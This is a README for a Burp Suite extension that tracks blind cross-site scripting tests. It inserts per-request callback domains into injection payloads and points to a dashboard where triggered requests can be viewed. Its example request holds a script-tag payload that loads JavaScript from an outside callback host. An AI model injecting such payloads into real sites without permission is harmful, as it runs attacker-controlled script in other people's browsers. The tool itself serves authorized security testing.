# What is the this tool for?

This tool can be used to generate relevant XSS addresses that can be used to track HTTP requests. By using this tool, all your injection attempts will be tracked and the reports you generate will include the full HTTP request in the final output.

# Minimum Burp Suite Version

2023.1

Because of the use of Burp Extensions API - Montoya

# Setup

You can download the jar directly and load it into burpsuite.

After loading the plugin, a new tab will be created, as shown below.

<img width="1048" alt="image" src="https://user-images.githubusercontent.com/16237562/215692824-f1174bbc-d00d-4d7e-b5b0-dd171aae7ac9.png">

Just fill in the form and click Login.

`replace` is the javascript address that needs to be replaced. (Try to ensure that `replace` is unlikely to appear in normal http. Guarantee uniqueness.)

For example (`replace` is `test123`)

```
GET /concat-us HTTP/1.1
Host: example.com
aaa: test123

content=testhello<script src="test123"></script>
```

Finally the extension will automatically update the request

```
GET /concat-us HTTP/1.1
Host: example.com
aaa: https://request-id-domain.xss.cl

content=testhello<script src="https://request-id-domain.xss.cl"></script>
```

# Where to view the request that triggered the payload

https://xss.bughunter.app/dashboard/trigger

<img width="1330" alt="image" src="https://user-images.githubusercontent.com/16237562/215695198-fd570376-050a-43dc-b4f4-4a604335c1f0.png">

